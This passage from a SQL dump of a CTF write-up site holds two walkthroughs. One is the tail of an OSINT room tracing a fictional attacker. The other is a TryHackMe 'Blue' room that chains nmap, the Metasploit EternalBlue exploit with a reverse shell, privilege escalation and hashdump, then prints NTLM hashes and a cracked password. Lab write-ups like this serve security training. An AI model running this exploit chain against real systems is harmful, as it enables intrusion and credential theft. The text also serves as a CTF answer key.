wallet?\r\nWe can change from the “Transactions” tab to the “Erc20 Token Txns” tab to see what was exchanged for.\r\n\r\nhttps://miro.medium.com/v2/resize:fit:720/format:webp/1*OdKuHLuxKfdlXKNS7uB9DQ.png\r\n\r\n\r\nViewing the cryptocurrency exchange\r\nTask 5: TAUNT\r\n1. What is the attacker’s current Twitter handle?\r\nWe found this in the Google search we performed.\r\n\r\n2. What is the URL for the location where the attacker saved their WiFi SSIDs and passwords?\r\nScrolling to the bottom of the attacker’s Twitter, we can see an image they posted from a deep web site for pasting stuff. This website no longer exists so this flag cannot be found correctly.\r\n\r\nTo get this flag, we must go to the link listed in the hint for the question. The flag is simply the url of the page with the md5 hash equal to the hash in the results. It’s annoying to type but it’s the only way to solve it.\r\n\r\n3. What is the BSSID for the attacker’s Home WiFi?\r\nFrom the paste in the last question, we have the SSID of the home WiFi network that the attacker uses. We can use Wigle to find the BSSID of it. We can filter for the SSID and near the top of Japan we can see a small dot which, when we zoom in, reveals the BSSID.\r\nhttps://miro.medium.com/v2/resize:fit:720/format:webp/1*d4MkT-qnD1ePWt4je0j5Lg.png\r\n\r\nTask 6: HOMEBOUND\r\n1. What airport is closest to the location the attacker shared a photo from prior to getting on their flight?\r\nIf we look at the attacker’s Twitter, we can see a tweet where they took a photo of some cherry blossoms before their flight.\r\n\r\nhttps://miro.medium.com/v2/resize:fit:640/format:webp/1*1cSerRWtzxGox5KJbLgM9A.png\r\n\r\nThe attacker’s tweet\r\nIn the background of the photo, we can see the Washington Monument, which means we just need to find the airport closest to it that has cherry blossoms. A Google search reveals the location.\r\n\r\nhttps://miro.medium.com/v2/resize:fit:720/format:webp/1*ffKqa3Om_4xSJPIpcgo3ig.png\r\n\r\nFinding the airport\r\nIf we Google that airport we get the three letter code which is the flag.\r\n\r\n2. What airport did the attacker have their last layover in?\r\nOur attacker sent out another tweet at the lounge they were staying at during their layover.\r\n\r\nhttps://miro.medium.com/v2/resize:fit:640/format:webp/1*3mDuntl-nmfoHyFoCzKZEA.png\r\n\r\nThe attacker’s layover location\r\nA quick Google search reveals that their are multiple JAL Sakura Lounges, but looking at the images tab shows that the location of the logo is different.\r\n\r\nhttps://miro.medium.com/v2/resize:fit:640/format:webp/1*HfIYu7ar3-PSgPwUBarXIA.png\r\n\r\nSakura Lounge logo at the Narita airport\r\nI then googled “JAL first class Sakura Lounge sign” to try to find a similar wall to the one uploaded to Twitter. After a little scrolling, I found a familiar background.\r\nhttps://miro.medium.com/v2/resize:fit:344/format:webp/1*K4-kWiwMA5ap0XiqPegTXQ.png\r\n\r\n\r\nJAL photo\r\nGoing to the blog reveals the name of the airport.\r\nhttps://miro.medium.com/v2/resize:fit:720/format:webp/1*bdIDdImrxmZveKVSuI_2zA.png\r\nFinding the name of the airport\r\nWe can then Google the airport name to get the three letter code.\r\n\r\n3. What lake can be seen in the map shared by the attacker as they were on their final flight home?\r\nAgain, the attacker shared an image to Twitter that we can use.\r\n\r\nhttps://miro.medium.com/v2/resize:fit:640/format:webp/1*_DdlXTg51q7uoFhngVuixw.png\r\n\r\nAnother tweet by the attacker\r\nThis is a pretty large lake, so we can probably use Google Maps to go to the general location and find the name.\r\n\r\nhttps://miro.medium.com/v2/resize:fit:720/format:webp/1*MREcHFO6PvGgMhQyqYGGDg.png\r\nLooking at Google Maps for the lake\r\nZooming in reveals the name of the lake.\r\n\r\nhttps://miro.medium.com/v2/resize:fit:720/format:webp/1*Sfoidaw-tDmXLPaN3RAMVQ.png\r\nFinding the name of the lake\r\n4. What city does the attacker likely consider “home”?\r\nIf we remember back to the “TAUNT” task, the attacker listed their home networks SSID, which we found the BSSID from. We can assume this is where they consider home.\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n', '0xZenith', '2024-04-07 14:37:03'),
	(11, '@TryHackMe - Blue (Eternal Blue) ', '--> https://tryhackme.com/r/room/blue\r\n\r\nhttps://tryhackme-images.s3.amazonaws.com/room-icons/7717bbc69c486931e503a74f3192a4d8.gif\r\n\r\nhttps://i.imgur.com/NhZIt9S.png\r\n\r\nDeploy & hack into a Windows machine, leveraging common misconfigurations issues.\r\n\r\n\r\nBlue is a windows machine with some misconfigurations which we have to exploit in this Room and find the three flags in the system in order to complete the room.\r\n\r\nScan the machine. (If you are unsure how to tackle this, I recommend checking out the Nmap room)\r\nNo need to answer this one.\r\n\r\nTask 1 :\r\n1. Scan the machine. (If you are unsure how to tackle this, I recommend checking out the Nmap room)\r\n\r\nnmap -sC -sV -A [Target_IP]\r\nWe will get our results as :\r\nhttps://miro.medium.com/v2/resize:fit:720/format:webp/1*Au4JI4-GPVA0JdCJdeakPg.png\r\n\r\nHow many ports are open with a port number under 1000?\r\nNmap scan shows that it has 3 ports open.\r\n\r\n\r\n2. How many ports are open with a port number under 1000?\r\n\r\nAns : 3 ports\r\n\r\n3. What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08–067)\r\n\r\nAfter searching on the internet for our windows version “Windows 7 Professional 7601 Service Pack 1 microsoft-ds” which we found vulnerable to :\r\n\r\nhttps://miro.medium.com/v2/resize:fit:720/format:webp/1*uoObnOW3m_8j9k2Pf8kD2A.png\r\n\r\n\r\n\r\nAns : MS17–010\r\n\r\nTask 2 :\r\n1. Start Metaslpoit\r\n\r\nRun msfconsole\r\n\r\n2. Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/……..)\r\n\r\nmsf5 > search MS17-010\r\nmsf5 > use 2  \r\n# for using the exploit\r\nHere we have our exploit :\r\n\r\n\r\nhttps://miro.medium.com/v2/resize:fit:720/format:webp/1*FkOdBzjE8lBJhoAvEEJ3sg.png\r\n\r\n3. Show options and set the one required value. What is the name of this value? (All caps for submission)\r\n\r\nHere we need to set our RHOSTS\r\n\r\nmsf5 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS [Target_IP]\r\n4. With that done, run the exploit!\r\n\r\nWe will set the payload and run our exploit\r\n\r\nmsf5 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp \r\nmsf5 exploit(windows/smb/ms17_010_eternalblue) > exploit\r\n\r\n\r\nhttps://miro.medium.com/v2/resize:fit:720/format:webp/1*HOOkeP8CuEeuYKGz3qxdzw.png\r\n\r\n\r\n5. Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target.\r\n\r\nAns : Press Ctrl + Z to background our shell\r\n\r\nTask 3 :\r\nConverting to Meterpreter Shell\r\n\r\n1. If you haven’t already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)\r\n\r\nAns : post/multi/manage/shell_to_meterpreter\r\n\r\nSteps to convert the shell :\r\n\r\n# remember ground the shell first using ctrl + z \r\nmsf5 exploit(windows/smb/ms17_010_eternalblue) > search shell_to_meterpreter \r\nmsf5 exploit(windows/smb/ms17_010_eternalblue) > use 0  \r\n# we will get something like this \r\nmsf5 post(multi/manage/shell_to_meterpreter) >  \r\n# Now get our session id in which our shell is running \r\nmsf5 post(multi/manage/shell_to_meterpreter) > sessions  \r\n# in my case session id is 2 \r\nmsf5 post(multi/manage/shell_to_meterpreter) > set SESSION 2 \r\n# run the exploit \r\nmsf5 post(multi/manage/shell_to_meterpreter) > run\r\n*IMP : if you get an error named “FAILED to start exploit … on port 1234” (for e.g) change the LPORT to something else\r\n\r\n2. Select this (use MODULE_PATH). Show options, what option are we required to change?\r\n\r\nAns : SESSION\r\n\r\nShifting to our Meterpreter session\r\nmsf5 post(multi/manage/shell_to_meterpreter) > sessions \r\n# get our newly opened shell id (3 in my case) \r\nmsf5 post(multi/manage/shell_to_meterpreter) > sessions -i 3 \r\nmeterpreter >\r\n6. Verify that we have escalated to NT AUTHORITY\\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command ‘shell’ and run ‘whoami’. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again.\r\n\r\nmeterpreter > getsystem\r\n7. List all of the processes running via the ‘ps’ command. Just because we are system doesn’t mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\\SYSTEM and write down the process id (far left column).\r\n\r\nmeterpreter > ps  \r\n# at the bottom we will get a process : \r\n3016  1532  powershell.exe        x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n# here PID (process id) is 3016\r\n8. Migrate to this process using the ‘migrate PROCESS_ID’ command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time.\r\n\r\nmeterpreter > migrate 3016\r\nTask 4 :\r\n1. Within our elevated meterpreter shell, run the command ‘hashdump’. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?\r\n\r\nmeterpreter > hashdump\r\nIf this command fails maybe your process was not shifted properly. Other wise we would get output as →\r\n\r\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\r\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\r\n Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::\r\n2. Copy this password hash to a file and research how to crack it. What is the cracked password?\r\n\r\nCopy the password hash of Jon — “ffb43f0de35be4d9917ac0cc8ad57f8d”\r\nGo to https://crackstation.net/ and paste our hash there\r\nWe get our result as alqfna22\r\n\r\nTask 5 :\r\n1. Flag1? This flag can be found at the system root.\r\n\r\nNavigate to Root\r\n\r\nmeterpreter > pwd \r\nC:\\Windows\\system32 \r\nmeterpreter > cd ../ \r\nmeterpreter > cd ../ \r\nmeterpreter > dir \r\nmeterpreter > cat flag1.txt\r\nFlag 1 : flag{a**************ine}\r\n\r\n2. Flag2? This flag can be found at the location where passwords are stored within Windows.\r\n\r\nIn windows passwords are stored in C:\\Windows\\System32\\Config\\\r\nNavigate to the path →\r\nWe will get our flag 2\r\n\r\nFlag 2 : flag{sa************************ss}\r\n\r\n3. flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.\r\n\r\nFirst navigate to john.\r\nWe have some idea on excellent locations (Desktop, Downloads, Documents ..)\r\nWe will find our flag in Documents folder.\r\n\r\n— or —\r\n\r\nWe can also search for flag 3 using\r\n\r\nmeterpreter > search -f flag3.txt\r\nFlag 3 : flag{ad***************************ble}\r\n\r\n\r\n\r\n\r\n\r\n', 'william', '2024-04-24 11:05:46');

-- Dumping structure for table writeups_gothenburg_central_v_231.users
CREATE TABLE IF NOT EXISTS `users` (
  `_id` int NOT NULL AUTO_INCREMENT,
  `username` varchar(255) COLLATE utf8mb4_general_ci DEFAULT NULL,
  `password` varchar(255) COLLATE utf8mb4_general_ci DEFAULT NULL,
  `reg_date` timestamp NULL DEFAULT NULL,
  `admin` tinyint(1) DEFAULT '0',
  `role` varchar(255) COLLATE utf8mb4_general_ci DEFAULT 'user',
  KEY `_id` (`_id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- Dumping data for table writeups_gothenburg_central_v_231.users: ~3 rows (approximately)
REPLACE INTO `users` (`_id`, `username`, `password`, `reg_date`, `admin`, `role`) VALUES
	(1, 'william', '$2b$10$scrambledscrambledscrambledscrambledscrambledscrambledscrambledscrambledscrambledscrambledscrambledscrambledscrambledscrambled', '2024-04-07 15:05:17', 0, 'user'),
	(2, 'test', '$2b$10$scrambledscrambledscrambledscrambledscrambledscrambledscrambledscrambledscrambledscrambledscrambledscrambledscrambledscrambledscrambledscrambled', '2024-04-07 12:19:45', 0, 'user'),
	(3, '0xZenith', '$2b$10$scrambledscrambledscrambledscrambledscrambledscrambledscrambledscrambledscrambledscrambledscrambledscrambledscrambledscrambledscrambledscrambledscrambledscrambledscrambledscrambledscrambledscrambledscrambledscrambledscrambled', '2024-04-07 13:51:53', 0, 'admin');

/*!40103 SET TIME_ZONE=IFNULL(@OLD_TIME_ZONE, 'system') */;
/*!40101 SET SQL_MODE=IFNULL(@OLD_SQL_MODE, '') */;
/*!40014 SET FOREIGN_KEY_CHECKS=IFNULL(@OLD_FOREIGN_KEY_CHECKS, 1) */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40111 SET SQL_NOTES=IFNULL(@OLD_SQL_NOTES, 1) */;
